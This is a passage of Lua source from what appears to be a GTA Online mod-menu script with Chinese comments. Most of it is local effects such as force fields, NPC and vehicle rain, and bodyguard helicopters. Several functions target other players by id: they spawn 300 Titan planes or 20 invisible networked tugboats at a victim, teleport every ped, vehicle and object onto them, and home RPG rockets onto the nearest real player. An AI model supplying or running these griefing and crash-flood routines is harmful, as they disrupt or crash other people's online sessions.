                PED.SET_PED_CAN_BE_KNOCKED_OFF_VEHICLE(ped, false)
            end
        end
    end
end


----罪城的水
function VicecityWater()
    if ENTITY.IS_ENTITY_IN_WATER(PLAYER.PLAYER_PED_ID()) and not PED.IS_PED_DEAD_OR_DYING(PLAYER.PLAYER_PED_ID()) then
        menu.trigger_commands("ewo")
    end
end


----力场
function force_Field(on)
    local mdl = util.joaat("p_spinning_anus_s")
    local playerpos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
    request_model(mdl)
    if on then
        obj = entities.create_object(mdl, playerpos)
        ENTITY.SET_ENTITY_VISIBLE(obj, false)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(obj, PLAYER.PLAYER_PED_ID(), 0, 0, 0, 0, 0, 0, 0, false, false, true, false, 0, false, 0)
    else 
        delete_entity(obj)
    end
end


----力场pro
local s_forcefield = 0
local s_forcefield_range = 20
function force_Field_direction(val)
    s_forcefield = val
end
function force_Field_range(value)
    s_forcefield_range = value / 100
end
function force_Field_pro()
    local _entities = {}
    local player_pos = players.get_position(PLAYER.PLAYER_ID())
    for _, vehicle in pairs(entities.get_all_vehicles_as_handles()) do
        local vehicle_pos = ENTITY.GET_ENTITY_COORDS(vehicle, false)
        if v3.distance(player_pos, vehicle_pos) <= s_forcefield_range then
            table.insert(_entities, vehicle)
        end
    end
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        local ped_pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        if (v3.distance(player_pos, ped_pos) <= s_forcefield_range) and not PED.IS_PED_A_PLAYER(ped) then
            table.insert(_entities, ped)
        end
    end
    for _, entity in pairs(_entities) do
        local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), true)
        local entity_type = ENTITY.GET_ENTITY_TYPE(entity)
        if NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity) and player_vehicle ~= entity then
            if entity_type == 1 then
                PED.SET_PED_TO_RAGDOLL(entity, 500, 0, 0, false, false, false)
            end
            if s_forcefield == 1 then
                ENTITY.APPLY_FORCE_TO_ENTITY(entity, 3, 0, 0, 1, 0, 0, 0.5, 0, false, false, true, false, false)
            else
                local force = ENTITY.GET_ENTITY_COORDS(entity)
                v3.sub(force, player_pos)
                v3.normalise(force)
                if s_forcefield == 2 then
                    v3.mul(force, -1)
                end
                ENTITY.APPLY_FORCE_TO_ENTITY(entity, 3, force.x, force.y, force.z, 0, 0, 0.5, 0, false, false, true, false, false)
            end
        end
    end
end
function Plot_force_field_range()
    local pos = players.get_position(PLAYER.PLAYER_ID())
    GRAPHICS.DRAW_MARKER_SPHERE(pos.x, pos.y, pos.z, s_forcefield_range, 223, 99, 231, 0.5)
end



----堆叠行人
function stack_npc()
    local c = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    all_peds = entities.get_all_peds_as_handles()
    local last_ped = 0
    local last_ped_ht = 0
    for k,ped in pairs(all_peds) do
        if not PED.IS_PED_A_PLAYER(ped) and not PED.IS_PED_FATALLY_INJURED(ped) then
            request_control(ped)
            if PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                TASK.TASK_LEAVE_ANY_VEHICLE(ped, 0, 16)
            end
    
            ENTITY.DETACH_ENTITY(ped, false, false)
            if last_ped ~= 0 then
                ENTITY.ATTACH_ENTITY_TO_ENTITY(ped, last_ped, 0, 0.0, 0.0, last_ped_ht-0.5, 0.0, 0.0, 0.0, false, false, false, false, 0, true, 0)
            else
                ENTITY.SET_ENTITY_COORDS(ped, c.x, c.y, c.z)
            end
            last_ped = ped
            last_ped_ht = get_model_size(ENTITY.GET_ENTITY_MODEL(ped)).z
        end
    end
end



----NPC雨
function Npc_Rain()
    for k, ped in pairs(entities.get_all_peds_as_handles()) do
        if not PED.IS_PED_A_PLAYER(ped) and not ENTITY.IS_ENTITY_IN_AIR(ped) then
            local ped_c = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
            ped_c.x = ped_c.x + math.random(-50, 50)
            ped_c.y = ped_c.y + math.random(-50, 50)
            ped_c.z = ped_c.z + math.random(50, 100)
            ENTITY.SET_ENTITY_COORDS(ped, ped_c.x, ped_c.y, ped_c.z)
            ENTITY.SET_ENTITY_VELOCITY(ped, 0.0, 0.0, -1.0)
        end
    end
end
----载具雨
function Vehicle_Rain()    
    for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
        local myveh = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)
        if myveh ~= veh and not ENTITY.IS_ENTITY_IN_AIR(veh) then 
            local ped_c = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
            ped_c.x = ped_c.x + math.random(-50, 50)
            ped_c.y = ped_c.y + math.random(-50, 50)
            ped_c.z = ped_c.z + math.random(100, 120)
            ENTITY.SET_ENTITY_COORDS(veh, ped_c.x, ped_c.y, ped_c.z)
        end
    end
end


----鱼雨
local fishtab = {}
function fish_rain()
    local hashes = {util.joaat('a_c_fish'), util.joaat('a_c_stingray')}
    local fish_hash = hashes[math.random(#hashes)]
    local c = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
    c.x = c.x + math.random(-30, 30)
    c.y = c.y + math.random(-30, 30)
    c.z = c.z + 50
    fishtab[#fishtab + 1] = create_ped(28, fish_hash, c.x, c.y, c.z, math.random(0,360))
    ENTITY.SET_ENTITY_HEALTH(fishtab[#fishtab + 1], 0.0, 1)
    ENTITY.APPLY_FORCE_TO_ENTITY(fishtab[#fishtab + 1], 1, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0, false, false, true, false, true)
    if #fishtab > 50 then
        delete_entity(fishtab[1])
        table.remove(fishtab, 1)
    end
    util.yield(100)
end


----生成多米诺骨牌
function Dominoes()
    local hash = util.joaat("prop_boogieboard_01")
    request_model(hash)
    local last_ent = PLAYER.PLAYER_PED_ID()
    for i= 2, 25 do 
        local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(last_ent, 0, i, 0)
        local d = entities.create_object(hash, c)
        ENTITY.SET_ENTITY_HEADING(d, ENTITY.GET_ENTITY_HEADING(last_ent))
        OBJECT.PLACE_OBJECT_ON_GROUND_PROPERLY(d)
    end
end


----实体引力
entityPairs = {}
shotEntities = {}
counter = 0
EntityPair = {ent1 = 0, ent2 = 0}
EntityPair.__index = EntityPair
function EntityPair.new(ent1, ent2)
	local instance = setmetatable({}, EntityPair)
	instance.ent1 = ent1
	instance.ent2 = ent2
	return instance
end
function EntityPair:exists()
	return ENTITY.DOES_ENTITY_EXIST(self.ent1) and ENTITY.DOES_ENTITY_EXIST(self.ent2)
end
function apply_force_to_ent(ent, force, flag)
	if ENTITY.IS_ENTITY_A_PED(ent) then
		if PED.IS_PED_A_PLAYER(ent) then return end
		PED.SET_PED_TO_RAGDOLL(ent, 1000, 1000, 0, false, false, false)
	end
	if request_control(ent) then
		ENTITY.APPLY_FORCE_TO_ENTITY(ent, flag or 1, force.x, force.y, force.z, 0.0, 0.0, 0.0, 0, false, false, true, false, false)
	end
end
function EntityPair:attract()
	local pos1 = ENTITY.GET_ENTITY_COORDS(self.ent1, false)
	local pos2 = ENTITY.GET_ENTITY_COORDS(self.ent2, false)
	local force = v3.new(pos2)
	force:sub(pos1)
	force:mul(0.05)
	apply_force_to_ent(self.ent1, force)
	force:mul(-1)
	apply_force_to_ent(self.ent2, force)
end
function table.find(t, value)
	for k, v in pairs(t) do
		if value == v then return k end
	end
	return nil
end
function table.insert_once(t, value)
	if not table.find(t, value) then table.insert(t, value) end
end
function EntityPair_new(ent1, ent2)----原函数名EntityPair.new()
	local instance = setmetatable({}, EntityPair)
	instance.ent1 = ent1
	instance.ent2 = ent2
	return instance
end
function ctst()
    local entity = get_entity_player_is_aiming_at(PLAYER.PLAYER_ID())
	if entity ~= 0 and ENTITY.DOES_ENTITY_EXIST(entity) then
		draw_bounding_box(entity, true, {r = 255, g = 255, b = 255, a = 81})

		if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) and
		not (shotEntities[1] and shotEntities[1] == entity) then
			counter = counter + 1
			shotEntities[counter] = entity
		end

		if counter == 2 then
			local entPair = EntityPair_new(table.unpack(shotEntities))
			table.insert_once(entityPairs, entPair)
			counter = 0
			shotEntities = {}
		end
	end
	for i = #entityPairs, 1, -1 do
		local entPair = entityPairs[i]
		if entPair:exists() then 
            entPair:attract() 
        else 
            table.remove(entityPairs, i) 
        end
	end
end
function ctst_stop()
    counter = 0
	shotEntities = {}; entityPairs = {}
end


-----保镖直升机
local heli_list = {}
local heli_ped_list = {}
function Bodyguard_helicopter(value)
    bodyguard_heli.name = sel_heli_model_list[value]
end
function Bodyguard_helicopter_invincible(toggle)
    bodyguard_heli.heli_godmode = toggle
end
function Spawn_bodyguard_helicopter()
    local heli_hash = util.joaat(bodyguard_heli.name)
    local ped_hash = util.joaat("s_m_y_blackops_01")
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    pos.x = pos.x + math.random(-10, 10)
    pos.y = pos.y + math.random(-10, 10)
    pos.z = pos.z + 30
    request_models(ped_hash, heli_hash)
    local heli = entities.create_vehicle(heli_hash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
    local heliNetId = NETWORK.VEH_TO_NET(heli)
    if NETWORK.NETWORK_GET_ENTITY_IS_NETWORKED(NETWORK.NET_TO_PED(heliNetId)) then
        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(heliNetId, true)
    end
    NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(heliNetId, PLAYER.PLAYER_ID(), true)
    VEHICLE.SET_VEHICLE_ENGINE_ON(heli, true, true, true)
    VEHICLE.SET_HELI_BLADES_FULL_SPEED(heli)
    VEHICLE.SET_VEHICLE_SEARCHLIGHT(heli, true, true)
    addBlipForEntity(heli, 422, 26)
    --health
    ENTITY.SET_ENTITY_INVINCIBLE(heli, bodyguard_heli.heli_godmode)
    ENTITY.SET_ENTITY_MAX_HEALTH(heli, 10000)
    ENTITY.SET_ENTITY_HEALTH(heli, 10000, 0)
    table.insert(heli_list, heli)

    local pilot = entities.create_ped(29, ped_hash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
    PED.SET_PED_INTO_VEHICLE(pilot, heli, -1)
    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(pilot, true)
    TASK.TASK_HELI_MISSION(pilot, heli, 0, PLAYER.PLAYER_PED_ID(), 0.0, 0.0, 0.0, 23, 80.0, 50.0, -1.0, 0, 10, -1.0, 0)
    PED.SET_PED_KEEP_TASK(pilot, true)
    PED.SET_PED_MAX_HEALTH(pilot, 1000)
    ENTITY.SET_ENTITY_HEALTH(pilot, 1000, 0)
    ENTITY.SET_ENTITY_INVINCIBLE(pilot, bodyguard_heli.ped_godmode)
    table.insert(heli_ped_list, pilot)
    relationship:friendly(pilot)

    local seats = VEHICLE.GET_VEHICLE_MAX_NUMBER_OF_PASSENGERS(heli)
    for i = 0, seats - 1 do
        local ped = entities.create_ped(29, ped_hash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
        local pedNetId = NETWORK.PED_TO_NET(ped)
        if NETWORK.NETWORK_GET_ENTITY_IS_NETWORKED(ped) then
            NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(pedNetId, true)
        end
        NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(pedNetId, PLAYER.PLAYER_ID(), true)
        PED.SET_PED_INTO_VEHICLE(ped, heli, i)
        --fight
        WEAPON.GIVE_WEAPON_TO_PED(ped, util.joaat("weapon_mg"), -1, false, true)
        WEAPON.SET_PED_INFINITE_AMMO_CLIP(ped, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 5, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 3, false)
        PED.SET_PED_COMBAT_MOVEMENT(ped, 2)
        PED.SET_PED_COMBAT_ABILITY(ped, 2)
        PED.SET_PED_COMBAT_RANGE(ped, 2)
        PED.SET_PED_SEEING_RANGE(ped, 500.0)
        PED.SET_PED_HEARING_RANGE(ped, 500.0)
        PED.SET_PED_TARGET_LOSS_RESPONSE(ped, 1)
        PED.SET_PED_HIGHLY_PERCEPTIVE(ped, true)
        PED.SET_PED_VISUAL_FIELD_PERIPHERAL_RANGE(ped, 500.0)
        PED.SET_COMBAT_FLOAT(ped, 10, 500.0)
        PED.SET_PED_SHOOT_RATE(ped, 1000.0)
        PED.SET_PED_ACCURACY(ped, 100.0)
        PED.SET_PED_CAN_BE_SHOT_IN_VEHICLE(ped, true)
        --health
        PED.SET_PED_MAX_HEALTH(ped, 1000)
        ENTITY.SET_ENTITY_HEALTH(ped, 1000, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(ped, bodyguard_heli.ped_godmode)
        relationship:friendly(ped)
        table.insert(heli_ped_list, ped)
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(heli_hash)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)
end
function delete_bodyguard_helicopter()
    for k, ent in pairs(heli_ped_list) do
        delete_entity(ent)
    end
    for k, ent in pairs(heli_list) do
        delete_entity(ent)
    end
end







----炸鱼
function fried_fish(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local Ptools_PanTable = {}
    local Ptools_PanCount = 1
    local targetped = PLAYER.GET_PLAYER_PED(pid)
    local targetcoords = ENTITY.GET_ENTITY_COORDS(targetped)
    local hash = util.joaat("tug")
    request_model(hash)
    for i = 1, 20 do
        Ptools_PanTable[Ptools_PanCount] = VEHICLE.CREATE_VEHICLE(hash, targetcoords.x, targetcoords.y, targetcoords.z, 0, true, true, true)
        local netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(Ptools_PanTable[Ptools_PanCount])
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(Ptools_PanTable[Ptools_PanCount])
        NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(netID)
        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netID)
        NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netID, false)
        NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(netID, pid, true)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Ptools_PanTable[Ptools_PanCount], true, false)
        ENTITY.SET_ENTITY_VISIBLE(Ptools_PanTable[Ptools_PanCount], false, 0)
        Ptools_PanCount = Ptools_PanCount + 1
    end
end


----泰坦号轰炸
function Titan_bombing(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local player_ped = PLAYER.GET_PLAYER_PED(pid)
    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
    request_model(447548909)
    local spam_amount = 300
    while spam_amount >= 1 do
        entities.create_vehicle(447548909, PlayerPedCoords, 0)
        spam_amount = spam_amount - 1
        util.yield(10)
    end
end


----渲染粒子
function Render_particles(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local player_pos = players.get_position(pid)
    request_ptfx_asset("scr_rcbarry2")
    GRAPHICS.USE_PARTICLE_FX_ASSET("scr_rcbarry2")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("scr_clown_death", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
    GRAPHICS.USE_PARTICLE_FX_ASSET("scr_rcbarry2")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("scr_exp_clown", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
    request_ptfx_asset("scr_ch_finale")
    GRAPHICS.USE_PARTICLE_FX_ASSET("scr_ch_finale")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("scr_ch_finale_drill_sparks", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
    util.yield(100)
end


--传送所有PED给玩家
function tpTableToPlayer(tbl, pid)
    if NETWORK.NETWORK_IS_PLAYER_CONNECTED(pid) then
        local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
        for _, v in pairs(tbl) do
            if (not PED.IS_PED_A_PLAYER(v)) then
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(v, c.x, c.y, c.z, false, false, false)
            end
        end
    end
end
function TpAllPeds(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local pedHandles = entities.get_all_peds_as_handles()
    tpTableToPlayer(pedHandles, pid)
end
--传送所有载具给玩家
function TpAllVehs(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local vehHandles = entities.get_all_vehicles_as_handles()
    tpTableToPlayer(vehHandles, pid)
end
--传送所有物体给玩家
function TpAllObjects(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local objHandles = entities.get_all_objects_as_handles()
    tpTableToPlayer(objHandles, pid)
end

----镭射炮
local Laserhash = util.joaat("VEHICLE_WEAPON_PLAYER_LAZER")
local Lasersound = Sound_new("Fire_Loop", "DLC_IE_VV_Gun_Player_Sounds")
function Lasersound:hasFinished()
	return AUDIO.HAS_SOUND_FINISHED(self.Id)
end
function Lasersound:stop()
	if self.Id ~= -1 then
        AUDIO.STOP_SOUND(self.Id)
        AUDIO.RELEASE_SOUND_ID(self.Id)
        self.Id = -1
    end
end
function Lasersound:playFromEntity(entity)
	if self.Id == -1 then
		self.Id = AUDIO.GET_SOUND_ID()
		AUDIO.PLAY_SOUND_FROM_ENTITY(self.Id, self.name, entity, self.reference, true, 0)
	end
end
function Laser_cannon()
    --显示按键
    display_buttons({{0, 46, '镭射炮'}})
    disable_control_action(106, 122, 135, 140, 141, 142, 263, 264)

    HUD.DISPLAY_SNIPER_SCOPE_THIS_FRAME()
    if not WEAPON.HAS_WEAPON_ASSET_LOADED(Laserhash) then
        WEAPON.REQUEST_WEAPON_ASSET(Laserhash, 31, 26)
    end
    if not PAD.IS_DISABLED_CONTROL_PRESSED(51, 51) then
        if not Lasersound:hasFinished() then
            Lasersound:stop()
        end
    elseif timer.elapsed() > 100 then
        local pos = PED.GET_PED_BONE_COORDS(PLAYER.PLAYER_PED_ID(), 0x322C, 0.0, 0.0, 0.0)
        local offset = get_offset_from_camera(80)
        if  Lasersound:hasFinished() then
            Lasersound:playFromEntity(PLAYER.PLAYER_PED_ID())
            AUDIO.SET_VARIABLE_ON_SOUND(Lasersound.Id, "fireRate", 10.0)
        end
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
            pos.x, pos.y, pos.z,
            offset.x, offset.y, offset.z,
            200,
            true,
            Laserhash, PLAYER.PLAYER_PED_ID(), true, true, -1.0
        )
        timer.reset()
    end
end




----RPG自动瞄准器
function GetClosestPlayerWithRange_Whitelist(range, inair)
    local pedPointers = entities.get_all_peds_as_pointers()
    local rangesq = range * range
    local ourCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local tbl = {}
    local closest_player = 0
    for i = 1, #pedPointers do
        local tarcoords = entities.get_position(pedPointers[i])
        local vdist = SYSTEM.VDIST2(ourCoords.x, ourCoords.y, ourCoords.z, tarcoords.x, tarcoords.y, tarcoords.z)
        if vdist <= rangesq then
            local handle = entities.pointer_to_handle(pedPointers[i])
            if (inair and (ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(handle) >= 9)) or (not inair) then --air check
                local pid = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(handle)
                if not AIM_WHITELIST[pid] then --this is the whitelist check.
                    tbl[#tbl+1] = handle
                end
            end
        end
    end
    if tbl ~= nil then
        local dist = 999999
        for i = 1, #tbl do
            if tbl[i] ~= PLAYER.PLAYER_PED_ID() then
                if PED.IS_PED_A_PLAYER(tbl[i]) then
                    local tarcoords = ENTITY.GET_ENTITY_COORDS(tbl[i])
                    local e = SYSTEM.VDIST2(ourCoords.x, ourCoords.y, ourCoords.z, tarcoords.x, tarcoords.y, tarcoords.z)
                    if e < dist then
                        dist = e
                        closest_player = tbl[i]
                    end
                end
            end
        end
    end
    if closest_player ~= 0 then
        return closest_player
    else
        return nil
    end
end
function RPG_Automatic_sight(on)
    if on then
        local Chosen_Rocket_Hash = "-1707997257"
        while true do
            local localped = PLAYER.PLAYER_PED_ID()
            local localcoords = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
            local forOffset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(localped, 0, 5, 0)
            RRocket = OBJECT.GET_CLOSEST_OBJECT_OF_TYPE(forOffset.x, forOffset.y, forOffset.z, 10, Chosen_Rocket_Hash, false, true, true, true)
            local p
            if missile_settings.multitarget then
                if missile_settings.air_target then
                    p = GetClosestPlayerWithRange_Whitelist_DisallowEntities(missile_settings.radius, MISSILE_ENTITY_TABLE, true)
                else
                    p = GetClosestPlayerWithRange_Whitelist_DisallowEntities(missile_settings.radius, MISSILE_ENTITY_TABLE, false)
                end
            elseif missile_settings.multiped then
                if missile_settings.air_target then
                    p = GetClosestNonPlayerPedWithRange_DisallowedEntities(missile_settings.radius, MISSILE_ENTITY_TABLE, true)
                else
                    p = GetClosestNonPlayerPedWithRange_DisallowedEntities(missile_settings.radius, MISSILE_ENTITY_TABLE, false)
                end
            elseif not missile_settings.multitarget then
                if missile_settings.air_target then
                    p = GetClosestPlayerWithRange_Whitelist(missile_settings.radius, true)
                else
                    p = GetClosestPlayerWithRange_Whitelist(missile_settings.radius, false)
                end
            end
            local ppcoords = ENTITY.GET_ENTITY_COORDS(p, false)
            if (RRocket ~= 0) and (p ~= nil) and (not PED.IS_PED_DEAD_OR_DYING(p)) and (not AIM_WHITELIST[NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(p)]) and (PED.IS_PED_SHOOTING(localped)) and (not players.is_in_interior(NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(p))) and (ppcoords.z > 1) then
                util.create_thread(function ()
                    local plocalized = p
                    local msl = RRocket
                    if missile_settings.multitarget then
                        MISSILE_ENTITY_TABLE[#MISSILE_ENTITY_TABLE+1] = plocalized
                    end
                    if (ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(localped, plocalized, 17) and missile_settings.los) or not missile_settings.los or MISL_AIR then
                            util.toast("前兆完成！")
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(msl)
                        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(msl) then
                            for i = 1, 10 do
                                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(msl)
                            end
                        else
                                util.toast("有控制权")
                        end
                        local aircount = 1
                        Missile_Camera = 0
                        STREAMING.REQUEST_NAMED_PTFX_ASSET(missile_particles.dictionary)
                        while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(missile_particles.dictionary) do
                            STREAMING.REQUEST_NAMED_PTFX_ASSET(missile_particles.dictionary)
                            util.yield()
                        end
                        GRAPHICS.USE_PARTICLE_FX_ASSET(missile_particles.dictionary)
                        while ENTITY.DOES_ENTITY_EXIST(msl) do
                                util.toast("火箭存在")
                            local pcoords2 = ENTITY.GET_ENTITY_COORDS(plocalized)
                            local pcoords = GetTableFromV3Instance(pcoords2)
                            local lc2 = ENTITY.GET_ENTITY_COORDS(msl)
                            local lc = GetTableFromV3Instance(lc2)
                            local look2 = v3.lookAt(lc2, pcoords2)
                            local look = GetTableFromV3Instance(look2)
                            local dir2 = v3.toDir(look2)
                            local dir = GetTableFromV3Instance(dir2)
                            if missile_settings.ptfx then
                                STREAMING.REQUEST_NAMED_PTFX_ASSET(missile_particles.dictionary)
                                while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(missile_particles.dictionary) do
                                    STREAMING.REQUEST_NAMED_PTFX_ASSET(missile_particles.dictionary)
                                    util.yield()
                                end
                                GRAPHICS.USE_PARTICLE_FX_ASSET(missile_particles.dictionary)
                                GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(missile_particles.name, lc.x, lc.y, lc.z, 0, 0, 0, 0.4 * missile_settings.ptfx_scale, false, false, false, true)
                            end
                            if aircount < 2 and MISL_AIR then
                                if ENTITY.DOES_ENTITY_EXIST(msl) then
                                    ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(msl, 1, 0, 0, 2700, true, false, true, true)
                                    aircount = aircount + 1
                                    util.yield(1100)
                                end
                            end
                            local lookCountD = 0
                            if MISL_AIR then
                                if missile_settings.cam then
                                    if not CAM.DOES_CAM_EXIST(Missile_Camera) then
                                            util.toast("相机设置")
                                        CAM.DESTROY_ALL_CAMS(true)
                                        Missile_Camera = CAM.CREATE_CAM("DEFAULT_SCRIPTED_CAMERA", true)
                                        CAM.SET_CAM_ACTIVE(Missile_Camera, true)
                                        CAM.RENDER_SCRIPT_CAMS(true, false, 0, true, true, 0)
                                    end
                                end
                                local distx = math.abs(lc.x - pcoords.x)
                                local disty = math.abs(lc.y - pcoords.y)
                                local distz = math.abs(lc.z - pcoords.z)
                                if missile_settings.cam then
                                    local ddisst = GENERIC_SYSTEM.VDIST(pcoords.x, pcoords.y, pcoords.z, lc.x, lc.y, lc.z)
                                    if ddisst > 50 then
                                        local camcoordv3 = CAM.GET_CAM_COORD(Missile_Camera)
                                        local look3 = v3.lookAt(camcoordv3, lc2)
                                        local look4 = GetTableFromV3Instance(look3)
                                        local backoffset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(msl, 10, 10, -2)
                                        CAM.SET_CAM_COORD(Missile_Camera, backoffset.x, backoffset.y, backoffset.z)
                                        if lookCountD < 1 then
                                            CAM.SET_CAM_ROT(Missile_Camera, look4.x, look4.y, look4.z, 2)
                                            lookCountD = lookCountD + 1
                                        end
                                    else
                                        local camcoordv3 = CAM.GET_CAM_COORD(Missile_Camera)
                                        local look3 = v3.lookAt(camcoordv3, lc2)
                                        local look4 = GetTableFromV3Instance(look3)
                                        CAM.SET_CAM_ROT(Missile_Camera, look4.x, look4.y, look4.z, 2)
                                    end
                                end
                                ENTITY.SET_ENTITY_ROTATION(msl, look.x, look.y, look.z, 2, true)
                                ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(msl, 1, dir.x * missile_settings.speed * distx, dir.y * missile_settings.speed * disty, dir.z * missile_settings.speed * distz, true, false, true, true)
                                util.yield()
                            else
                                ENTITY.SET_ENTITY_ROTATION(msl, look.x, look.y, look.z, 2, true)
                                ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(msl, 1, dir.x * missile_settings.speed, dir.y * missile_settings.speed, dir.z * missile_settings.speed, true, false, true, true)
                                util.yield()
                            end
                        end
                        if missile_settings.cam then
                            util.yield(2000)
                                util.toast("相机删除")
                            CAM.RENDER_SCRIPT_CAMS(false, false, 0, true, true, 0)
                            if CAM.IS_CAM_ACTIVE(Missile_Camera) then
                                CAM.SET_CAM_ACTIVE(Missile_Camera, false)
                            end
                            CAM.DESTROY_CAM(Missile_Camera, true)
                        end
                    end
                    if missile_settings.multitarget then
                        table.remove(MISSILE_ENTITY_TABLE, GetValueIndexFromTable(MISSILE_ENTITY_TABLE, plocalized))
                        util.toast("已删除的值" .. tostring(plocalized) .. " at index " .. tostring(GetValueIndexFromTable(MISSILE_ENTITY_TABLE, p)))
                    end
                end)
            end
            util.yield()
        end
    end
end

--自动驾驶到坐标
function auto_driving_to_coord(ped, x, y, z, speed, style, stopRange)
    if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then 
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        if VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1) == ped then

            if VEHICLE.IS_THIS_MODEL_A_HELI(ENTITY.GET_ENTITY_MODEL(vehicle)) then--直升机
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                TASK.TASK_HELI_MISSION(ped, vehicle, 0, 0, x, y, z, 4, 80.0, 50.0, -1.0, 0.0, 500.0, 0, 0)
                PED.SET_PED_KEEP_TASK(ped, true)
            elseif VEHICLE.IS_THIS_MODEL_A_PLANE(ENTITY.GET_ENTITY_MODEL(vehicle)) then--飞机
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                TASK.TASK_PLANE_MISSION(ped, vehicle, 0, 0, x, y, z, 4, 80.0, 50.0, -1.0, 900.0,500.0, true)
                PED.SET_PED_KEEP_TASK(ped, true)
            elseif VEHICLE.IS_THIS_MODEL_A_BOAT(ENTITY.GET_ENTITY_MODEL(vehicle)) then--船
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                TASK.TASK_BOAT_MISSION(ped, vehicle, 0, 0, x, y, z, 4, speed, style, 0, 0)
                PED.SET_PED_KEEP_TASK(ped, true)
            else--车
                TASK1.TASK_VEHICLE_DRIVE_TO_COORD_LONGRANGE(ped, vehicle, x, y, z, speed / 3.6, style, stopRange)
            end

        end
    end
end




------自动驾驶
local drivestyle = 786603
local drivespeed = 70
local Auto_driving_ped --定义局部
